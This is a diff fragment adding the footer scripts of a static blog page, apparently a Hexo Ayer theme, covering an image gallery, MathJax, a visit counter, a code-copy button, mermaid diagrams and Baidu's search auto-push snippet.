+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
